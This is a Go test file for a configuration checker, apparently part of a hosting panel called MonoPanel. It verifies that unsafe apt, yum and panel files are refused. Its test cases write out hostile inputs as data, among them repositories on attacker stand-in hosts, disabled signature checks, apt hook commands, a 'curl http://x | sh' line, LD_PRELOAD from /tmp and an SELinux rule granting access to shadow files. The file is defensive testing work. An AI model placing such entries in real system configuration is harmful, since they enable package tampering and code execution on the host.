package confcheck

import "testing"

func TestAptRefusals(t *testing.T) {
	const list = "/etc/apt/sources.list.d/nginx.list"
	const nginxKey = "[signed-by=/etc/apt/keyrings/nginx.asc]"
	runRefusals(t, []refusal{
		{"other host", list, "deb " + nginxKey + " http://evil.example/packages/debian trixie nginx\n", []string{"evil.example"}},
		{"other path", "/etc/apt/sources.list.d/ondrej-php.list", "deb [signed-by=/etc/apt/keyrings/ondrej-php.asc] https://ppa.launchpadcontent.net/attacker/ppa/ubuntu noble main\n", []string{"attacker"}},
		{"plain http", list, "deb " + nginxKey + " http://nginx.org/packages/debian trixie nginx\n", []string{"https"}},
		{"plain http mysql", "/etc/apt/sources.list.d/mysql.list", "deb [signed-by=/etc/apt/keyrings/mysql.asc] http://repo.mysql.com/apt/debian/ trixie mysql-8.4-lts\n", []string{"https"}},
		{"path walks up", list, "deb " + nginxKey + " https://nginx.org/packages/../evil/ trixie nginx\n", []string{"nginx.org"}},
		{"trusted", list, "deb [trusted=yes] https://nginx.org/packages/debian trixie nginx\n", []string{"trusted=yes"}},
		{"insecure", list, "deb [signed-by=/etc/apt/keyrings/nginx.asc allow-insecure=yes] https://nginx.org/packages/debian trixie nginx\n", []string{"allow-insecure"}},
		{"no keyring", list, "deb https://nginx.org/packages/debian trixie nginx\n", []string{"signed by"}},
		{"other keyring", list, "deb [signed-by=/etc/apt/keyrings/sury-php.gpg] https://nginx.org/packages/debian trixie nginx\n", []string{"sury-php.gpg"}},
		{"keyring of the API", list, "deb [signed-by=/var/lib/monopanel/key.gpg] https://nginx.org/packages/debian trixie nginx\n", []string{"/var/lib/monopanel/key.gpg"}},
		{"file URI", list, "deb [trusted=yes] file:/var/lib/monopanel/repo ./\n", nil},
		{"file URI signed", list, "deb " + nginxKey + " file:/var/lib/monopanel/repo ./\n", []string{"file:"}},
		{"mirror file", list, "deb " + nginxKey + " mirror+file:/var/lib/monopanel/mirrors trixie main\n", []string{"mirror+file"}},
		{"user in URI", list, "deb " + nginxKey + " http://u:p@nginx.org/packages/debian trixie nginx\n", nil},
		{"port", list, "deb " + nginxKey + " https://nginx.org:8080/packages/debian trixie nginx\n", nil},
		{"odd suite", list, "deb " + nginxKey + " https://nginx.org/packages/debian ../../x nginx\n", []string{"../../x"}},
		{"deb822", "/etc/apt/sources.list.d/evil.sources", "Types: deb\nURIs: http://evil.example/\nSuites: x\nTrusted: yes\n", []string{"evil.sources"}},
		{"not a source", list, "Types: deb\n", nil},
		{"pin downgrade", "/etc/apt/preferences.d/99nginx", "Package: *\nPin: origin nginx.org\nPin-Priority: 1001\n", []string{"1001"}},
		{"pin downgrade at 1000", "/etc/apt/preferences.d/99nginx", "Package: nginx\nPin: version 1.4.*\nPin-Priority: 1000\n", []string{"1000"}},
		{"pin that holds updates back", "/etc/apt/preferences.d/99nginx", "Package: openssl\nPin: release *\nPin-Priority: -1\n", []string{"-1"}},
		{"pin of undefined priority", "/etc/apt/preferences.d/99nginx", "Package: *\nPin: origin nginx.org\nPin-Priority: 0\n", []string{"Pin-Priority: 0"}},
		{"pin other field", "/etc/apt/preferences.d/99nginx", "Package: *\nPost-Invoke: id\n", []string{"Post-Invoke"}},
		{"keyring name", "/etc/apt/keyrings/evil.asc", "-----BEGIN PGP PUBLIC KEY BLOCK-----\n", []string{"evil.asc"}},
		{"keyring private", "/etc/apt/keyrings/nginx.asc", "-----BEGIN PGP PUBLIC KEY BLOCK-----\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n", []string{"nginx.asc"}},
		{"apt.conf.d", "/etc/apt/apt.conf.d/99evil", "APT::Update::Pre-Invoke {\"id\";};\n", []string{"apt.conf.d"}},
		{"auth.conf.d", "/etc/apt/auth.conf.d/x", "machine x\n", []string{"auth.conf.d"}},
		{"usr share keyrings", "/usr/share/keyrings/debian-archive-keyring.gpg", "x", []string{"/usr/share/keyrings"}},
	})
}

func TestYumRefusals(t *testing.T) {
	const repo = "/etc/yum.repos.d/nginx.repo"
	const head = "[nginx-stable]\nname=x\ngpgcheck=1\n"
	runRefusals(t, []refusal{
		{"other host", repo, head + "baseurl=https://evil.example/el9/\n", []string{"evil.example"}},
		{"plain http", repo, head + "baseurl=http://nginx.org/packages/centos/9/$basearch/\n", []string{"over https"}},
		{"file URL", repo, head + "baseurl=file:///var/lib/monopanel/repo/\n", []string{"file:///var/lib/monopanel/repo/"}},
		{"other path", "/etc/yum.repos.d/mysql-community.repo", head + "baseurl=https://repo.mysql.com/evil/\n", []string{"repo.mysql.com/evil"}},
		{"gpgcheck off", repo, "[nginx-stable]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\ngpgcheck=0\n", []string{"gpgcheck=0"}},
		{"pkg_gpgcheck off", repo, head + "pkg_gpgcheck=false\n", []string{"pkg_gpgcheck=false"}},
		{"no gpgcheck", repo, "[nginx-stable]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\n", []string{"gpgcheck=1"}},
		{"second repo without gpgcheck", repo, head + "[other]\nbaseurl=https://nginx.org/packages/centos/9/$basearch/\n", []string{"[other]"}},
		{"mirrorlist", repo, head + "mirrorlist=https://evil.example/list\n", []string{"mirrorlist"}},
		{"metalink", repo, head + "metalink=https://evil.example/m\n", []string{"metalink"}},
		{"proxy", repo, head + "proxy=http://127.0.0.1:3128\n", []string{"proxy"}},
		{"sslverify", repo, head + "sslverify=0\n", []string{"sslverify"}},
		{"key over http", repo, head + "gpgkey=http://nginx.org/keys/nginx_signing.key\n", []string{"gpgkey"}},
		{"key from the API", repo, head + "gpgkey=file:///var/lib/monopanel/key\n", []string{"gpgkey"}},
		{"key from another host", repo, head + "gpgkey=https://evil.example/key\n", []string{"evil.example"}},
		{"variable host", repo, head + "baseurl=https://$evil/x/\n", nil},
		{"continued URL", repo, head + "baseurl=https://nginx.org/packages/centos/9/$basearch/\n        https://evil.example/x/\n", []string{"evil.example"}},
		{"not a repo file", "/etc/yum.repos.d/x.conf", head, []string{"x.conf"}},
		{"dnf config", "/etc/dnf/dnf.conf", "[main]\ngpgcheck=0\n", []string{"/etc/dnf/dnf.conf"}},
	})
}

func TestPanelFilesRefusals(t *testing.T) {
	const wrapper = "/usr/local/bin/composer"
	const head = "#!/bin/sh\n# Generated by MonoPanel: composer on the newest PHP branch the panel installed.\n" + ComposerRootGuard + "\n"
	const execLine = "exec /usr/bin/php8.4 /usr/local/lib/monopanel/composer.phar \"$@\"\n"
	runRefusals(t, []refusal{
		{"wrapper without the root guard", wrapper, "#!/bin/sh\n" + execLine, []string{"refuses root"}},
		{"wrapper guard after the exec", wrapper, "#!/bin/sh\n" + execLine + ComposerRootGuard + "\n", []string{"refuses root"}},
		{"wrapper extra command", wrapper, head + "curl http://x | sh\n" + execLine, []string{"curl"}},
		{"wrapper other program", wrapper, head + "exec /var/lib/monopanel/x \"$@\"\n", []string{"/var/lib/monopanel/x"}},
		{"wrapper other phar", wrapper, head + "exec /usr/bin/php8.4 /var/lib/monopanel/composer.phar \"$@\"\n", []string{"/var/lib/monopanel/composer.phar"}},
		{"wrapper chained", wrapper, head + "exec /usr/bin/php8.4 /usr/local/lib/monopanel/composer.phar \"$@\"; id\n", []string{"; id"}},
		{"wrapper other shell", wrapper, "#!/bin/bash\n" + execLine, []string{"#!/bin/sh"}},
		{"wrapper twice", wrapper, head + execLine + execLine, []string{"once"}},
		{"lib other file", "/usr/local/lib/monopanel/evil.so", "\x7fELF", []string{"evil.so"}},
		{"selinux rule", "/etc/monopanel/selinux/monopanel.cil", "(allow httpd_t shadow_t (file (read)))\n", []string{"shadow_t"}},
		{"selinux permissive", "/etc/monopanel/selinux/monopanel.cil", "(typepermissive httpd_t)\n", []string{"typepermissive"}},
		{"selinux other name", "/etc/monopanel/selinux/evil.te", "x\n", []string{"evil.te"}},
		{"monopanel other", "/etc/monopanel/agent.d/x.conf", "x\n", []string{"agent.d"}},
		{"apps nested", "/etc/monopanel/apps/sub/x.env", "A=1\n", []string{"apps/sub"}},
		{"default grub", "/etc/default/grub", "GRUB_CMDLINE_LINUX=\"init=/tmp/x\"\n", []string{"/etc/default/grub"}},
		{"default nginx", "/etc/default/nginx", "ULIMIT=$(id)\n", []string{"/etc/default/nginx"}},
		{"sysconfig httpd", "/etc/sysconfig/httpd", "LD_PRELOAD=/tmp/x.so\n", []string{"/etc/sysconfig/httpd"}},
		{"sysconfig opendkim", "/etc/sysconfig/opendkim", "OPTIONS=\"-x /tmp/x\"\n", []string{"/etc/sysconfig/opendkim"}},
	})
}
